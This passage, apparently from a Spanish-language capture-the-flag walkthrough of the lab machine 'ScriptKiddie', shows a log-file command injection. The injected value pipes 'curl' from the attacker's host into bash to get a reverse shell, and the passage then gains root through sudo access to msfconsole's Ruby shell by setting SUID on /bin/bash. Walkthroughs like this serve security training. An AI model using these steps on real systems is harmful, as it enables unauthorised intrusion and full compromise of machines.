* Abre una netcat:
```
nc -nvlp 443
listening on [any] 443 ...
```
* Modifica el Payload agregando el comando **curl** y pipea Bash:
```
echo "[2023-05-08 23:10:46.713999] 10.10.10.226; curl 10.10.14.16 | bash #" > hackers
```
* Cuando lo modifiques, ejecútalo y ve a la netcat:
```
nc -nvlp 443                            
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.226] 48562
bash: cannot set terminal process group (865): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
```
¡Listo! Ya somos el usuario **pwn**, ahora escalemos privilegios.

<h2 id="Root">Escalando Privilegios para ser Root</h2>

**IMPORTANTE**:

No tenemos una shell interactiva, hazla interactiva y continuas.

Veamos qué privilegios tenemos:
```
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
Bien, entremos a Metasploit:
```
pwn@scriptkiddie:~$ sudo msfconsole
...
```
Hay una forma de escalar privilegios con esta consola de Metasploit y es con Ruby, debemos activar Ruby para poder hacer cosillas:
```
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("whoami")
root
=> true
```
Y bien, podemos hacer dos cosas, cambiar los permisos de la Bash y/o entrar a la Bash:
```
>> system("chmod u+s /bin/bash")
=> true
>> system("bash")
root@scriptkiddie:/home/pwn# whoami
root
```
Y ya busca la flag:
```
root@scriptkiddie:/home/pwn# cd /root
root@scriptkiddie:~# ls -la
total 44
drwx------  7 root root 4096 Feb  3  2021 .
drwxr-xr-x 20 root root 4096 Feb  3  2021 ..
lrwxrwxrwx  1 root kid     9 Jan  5  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jan  5  2021 .cache
drwxr-xr-x  3 root root 4096 Jan  5  2021 .gem
lrwxrwxrwx  1 root root    9 Feb  3  2021 .lesshst -> /dev/null
drwxr-xr-x  3 root root 4096 Jan  5  2021 .local
drwxr-xr-x  9 root root 4096 Jan 28  2021 .msf4
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   75 Jan  5  2021 .selected_editor
lrwxrwxrwx  1 root root    9 Feb  3  2021 .viminfo -> /dev/null
-r--------  1 root root   33 May  8 20:23 root.txt
drwxr-xr-x  3 root root 4096 Jan 28  2021 snap
root@scriptkiddie:~# cat root.txt
...
```
Al fin, terminamos la máquina.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://werkzeug.palletsprojects.com/en/2.3.x/
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
* https://github.com/DominicBreuker/pspy/releases


<br>
# FIN
